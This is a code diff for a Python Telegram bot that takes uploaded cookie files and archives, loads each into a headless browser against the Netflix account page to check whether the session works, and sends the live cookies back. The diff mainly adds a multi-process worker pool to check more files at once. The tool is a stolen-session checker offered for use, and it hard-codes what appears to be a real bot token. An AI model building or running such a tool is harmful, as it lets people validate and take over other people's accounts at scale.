@@ -5,6 +5,9 @@ import asyncio
 import re
 import shutil
 import logging
+import multiprocessing
+from concurrent.futures import ProcessPoolExecutor
+from functools import partial
 from pyunpack import Archive
 from telegram import Update, InputFile
 from telegram.ext import (
@@ -13,16 +16,17 @@ from telegram.ext import (
 )
 from playwright.async_api import async_playwright
 
+# ========== Configuration ==========
+WORKERS = 3  # Change this to adjust worker count
+BOT_TOKEN = "8495284623:AAEyQ5XqAD9muGHwtCS05j2znIH5JzglfdQ"
+TARGET_URL = "https://www.netflix.com/account"
+
 # ========== Logging ==========
 logging.basicConfig(
     format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
-
-# ========== Config ==========
-BOT_TOKEN = "8495284623:AAEyQ5XqAD9muGHwtCS05j2znIH5JzglfdQ"
-TARGET_URL = "https://www.netflix.com/account"
 
 # ========== Helpers ==========
 
@@ -100,89 +104,137 @@ def parse_netscape_cookies(file_path):
     
     return cookies
 
-async def process_cookie_file(input_path):
-    logger.info(f"Processing file: {input_path}")
+# ========== Worker Process Function ==========
+def process_cookie_file_worker(input_path):
+    """Worker function that runs in separate process"""
+    import asyncio
+    from playwright.async_api import async_playwright
     
-    # Try to detect file format
-    try:
-        with open(input_path, "r", encoding="utf-8") as f:
-            first_line = f.readline().strip()
-            f.seek(0)  # Reset file pointer
-            
-            # Check if it's Netscape format
-            if first_line.startswith('#') or '\t' in first_line:
-                logger.info("Detected Netscape cookie format")
-                all_cookies = parse_netscape_cookies(input_path)
-                if not all_cookies:
-                    return None
-            else:
-                # Try JSON format
-                logger.info("Attempting JSON cookie format")
-                try:
-                    data = json.load(f)
-                    all_cookies = data if isinstance(data, list) else [data]
-                except json.JSONDecodeError:
-                    logger.error("File is neither valid JSON nor Netscape format")
-                    return None
-                    
-    except Exception as e:
-        logger.error(f"Failed to read file: {e}")
-        return None
-
-    playwright_cookies = []
-
-    for c in all_cookies:
+    async def _process():
+        logger.info(f"[Worker {os.getpid()}] Processing file: {input_path}")
+        
+        # Try to detect file format
         try:
-            playwright_cookies.append(normalize_cookie(c))
+            with open(input_path, "r", encoding="utf-8") as f:
+                first_line = f.readline().strip()
+                f.seek(0)  # Reset file pointer
+                
+                # Check if it's Netscape format
+                if first_line.startswith('#') or '\t' in first_line:
+                    logger.info(f"[Worker {os.getpid()}] Detected Netscape cookie format")
+                    all_cookies = parse_netscape_cookies(input_path)
+                    if not all_cookies:
+                        return None
+                else:
+                    # Try JSON format
+                    logger.info(f"[Worker {os.getpid()}] Attempting JSON cookie format")
+                    try:
+                        data = json.load(f)
+                        all_cookies = data if isinstance(data, list) else [data]
+                    except json.JSONDecodeError:
+                        logger.error(f"[Worker {os.getpid()}] File is neither valid JSON nor Netscape format")
+                        return None
+                        
         except Exception as e:
-            logger.warning(f"Skipping malformed cookie: {e}")
-
-    if not playwright_cookies:
-        logger.error("No valid cookies to process.")
-        return None
-
-    async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=True)
-        context = await browser.new_context()
-
-        try:
-            await context.add_cookies(playwright_cookies)
-        except Exception as e:
-            logger.warning(f"Cookie inject failed: {e}")
-            await browser.close()
+            logger.error(f"[Worker {os.getpid()}] Failed to read file: {e}")
             return None
 
-        page = await context.new_page()
-        logger.info(f"Navigating to {TARGET_URL}...")
-        await page.goto(TARGET_URL, wait_until="load")
-        await page.wait_for_load_state("networkidle")
+        playwright_cookies = []
 
-        if page.url.startswith(TARGET_URL):
-            logger.info("✅ Valid session — account page loaded")
-            new_cookies = await context.cookies()
+        for c in all_cookies:
+            try:
+                playwright_cookies.append(normalize_cookie(c))
+            except Exception as e:
+                logger.warning(f"[Worker {os.getpid()}] Skipping malformed cookie: {e}")
 
-            if not new_cookies:
-                logger.error("No cookies returned — not exporting.")
+        if not playwright_cookies:
+            logger.error(f"[Worker {os.getpid()}] No valid cookies to process.")
+            return None
+
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=True)
+            context = await browser.new_context()
+
+            try:
+                await context.add_cookies(playwright_cookies)
+            except Exception as e:
+                logger.warning(f"[Worker {os.getpid()}] Cookie inject failed: {e}")
                 await browser.close()
                 return None
 
-            for cookie in new_cookies:
-                if "sameSite" in cookie and isinstance(cookie["sameSite"], str):
-                    s = cookie["sameSite"].lower()
-                    mapping = {"lax": "lax", "strict": "strict", "none": "no_restriction"}
-                    cookie["sameSite"] = mapping.get(s, "lax")
+            page = await context.new_page()
+            logger.info(f"[Worker {os.getpid()}] Navigating to {TARGET_URL}...")
+            await page.goto(TARGET_URL, wait_until="load")
+            await page.wait_for_load_state("networkidle")
 
-            export_path = next_export_filename()
-            with open(export_path, "w", encoding="utf-8") as f:
-                json.dump(new_cookies, f, separators=(",", ":"))
-                logger.info(f"Exported cookies to {export_path}")
+            if page.url.startswith(TARGET_URL):
+                logger.info(f"[Worker {os.getpid()}] ✅ Valid session — account page loaded")
+                new_cookies = await context.cookies()
 
-            await browser.close()
-            return export_path
-        else:
-            logger.warning("❌ Invalid session — redirected to login or another page")
-            await browser.close()
+                if not new_cookies:
+                    logger.error(f"[Worker {os.getpid()}] No cookies returned — not exporting.")
+                    await browser.close()
+                    return None
+
+                for cookie in new_cookies:
+                    if "sameSite" in cookie and isinstance(cookie["sameSite"], str):
+                        s = cookie["sameSite"].lower()
+                        mapping = {"lax": "lax", "strict": "strict", "none": "no_restriction"}
+                        cookie["sameSite"] = mapping.get(s, "lax")
+
+                export_path = next_export_filename()
+                with open(export_path, "w", encoding="utf-8") as f:
+                    json.dump(new_cookies, f, separators=(",", ":"))
+                    logger.info(f"[Worker {os.getpid()}] Exported cookies to {export_path}")
+
+                await browser.close()
+                return export_path
+            else:
+                logger.warning(f"[Worker {os.getpid()}] ❌ Invalid session — redirected to login or another page")
+                await browser.close()
+                return None
+    
+    return asyncio.run(_process())
+
+# ========== Process Pool Management ==========
+class WorkerPool:
+    def __init__(self, max_workers=WORKERS):
+        self.max_workers = max_workers
+        self.executor = None
+    
+    def start(self):
+        if self.executor is None:
+            self.executor = ProcessPoolExecutor(max_workers=self.max_workers)
+            logger.info(f"Started worker pool with {self.max_workers} workers")
+    
+    def stop(self):
+        if self.executor:
+            self.executor.shutdown(wait=True)
+            self.executor = None
+            logger.info("Worker pool stopped")
+    
+    async def process_file(self, file_path):
+        if not self.executor:
+            self.start()
+        
+        loop = asyncio.get_event_loop()
+        try:
+            result = await loop.run_in_executor(
+                self.executor,
+                process_cookie_file_worker,
+                file_path
+            )
+            return result
+        except Exception as e:
+            logger.error(f"Worker process failed: {e}")
             return None
+
+# Global worker pool instance
+worker_pool = WorkerPool(max_workers=WORKERS)
+
+async def process_cookie_file(input_path):
+    """Main interface for processing cookie files using worker pool"""
+    return await worker_pool.process_file(input_path)
 
 async def send_result(update, exported_path):
     if exported_path and os.path.isfile(exported_path):
@@ -202,11 +254,21 @@ async def send_result(update, exported_path):
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👋 Send me a `.txt`, `.zip`, or `.rar` cookie file and I'll process each for you."
+        f"👋 Send me a `.txt`, `.zip`, or `.rar` cookie file and I'll process each for you.\n"
+        f"🔧 Running with {WORKERS} workers for faster processing!"
     )
 
 async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("pong 🏓")
+    await update.message.reply_text(f"pong 🏓\n⚙️ Workers: {WORKERS}")
+
+async def workers_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Command to show current worker configuration"""
+    await update.message.reply_text(
+        f"⚙️ Worker Configuration:\n"
+        f"• Active Workers: {WORKERS}\n"
+        f"• Pool Status: {'Running' if worker_pool.executor else 'Stopped'}\n"
+        f"• Process ID: {os.getpid()}"
+    )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
@@ -226,7 +288,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await telegram_file.download_to_drive(downloaded_name)
 
     if file_ext == ".txt":
-        await update.message.reply_text("🔄 Processing your cookie...")
+        await update.message.reply_text(f"🔄 Processing your cookie with {WORKERS} workers...")
         exported_path = await process_cookie_file(downloaded_name)
         await send_result(update, exported_path)
         os.remove(downloaded_name)
@@ -242,21 +304,44 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         processed = 0
+        tasks = []
+        
+        # Collect all .txt files first
+        txt_files = []
         for root, dirs, files in os.walk(extract_dir):
             for filename in files:
                 if filename.endswith(".txt"):
-                    full_path = os.path.join(root, filename)
-                    await update.message.reply_text(f"🔄 Processing `{filename}`...")
-                    exported_path = await process_cookie_file(full_path)
-                    if exported_path:
-                        await send_result(update, exported_path)
-                        processed += 1
+                    txt_files.append((os.path.join(root, filename), filename))
+        
+        if not txt_files:
+            await update.message.reply_text("❌ No valid `.txt` cookie files found in the archive.")
+            shutil.rmtree(extract_dir)
+            os.remove(downloaded_name)
+            return
+        
+        await update.message.reply_text(f"📁 Found {len(txt_files)} cookie files. Processing with {WORKERS} workers...")
+        
+        # Process files with worker pool
+        for full_path, filename in txt_files:
+            await update.message.reply_text(f"🔄 Processing `{filename}`...")
+            exported_path = await process_cookie_file(full_path)
+            if exported_path:
+                await send_result(update, exported_path)
+                processed += 1
 
         if processed == 0:
-            await update.message.reply_text("❌ No valid `.txt` cookie files found in the archive.")
+            await update.message.reply_text("❌ No valid cookie files were processed successfully.")
+        else:
+            await update.message.reply_text(f"✅ Successfully processed {processed}/{len(txt_files)} files!")
 
         shutil.rmtree(extract_dir)
         os.remove(downloaded_name)
+
+# ========== Application Shutdown Handler ==========
+async def shutdown_handler(app):
+    """Gracefully shutdown worker pool"""
+    logger.info("Shutting down worker pool...")
+    worker_pool.stop()
 
 # ========== Run Bot ==========
 
@@ -264,11 +349,26 @@ async def post_init(app):
     await app.bot.delete_webhook(drop_pending_updates=True)
     me = await app.bot.get_me()
     logger.info("✅ Logged in as @%s (%s)", me.username, me.id)
+    logger.info(f"🔧 Initialized with {WORKERS} workers")
+    
+    # Start worker pool
+    worker_pool.start()
 
-app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
-app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("ping", ping))
-app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+if __name__ == "__main__":
+    # Set multiprocessing start method for compatibility
+    multiprocessing.set_start_method('spawn', force=True)
+    
+    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("ping", ping))
+    app.add_handler(CommandHandler("workers", workers_info))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
-print("🤖 Bot is running...")
-app.run_polling(drop_pending_updates=True)
+    try:
+        print(f"🤖 Bot is running with {WORKERS} workers...")
+        app.run_polling(drop_pending_updates=True)
+    except KeyboardInterrupt:
+        logger.info("Bot stopped by user")
+    finally:
+        # Cleanup worker pool
+        worker_pool.stop()
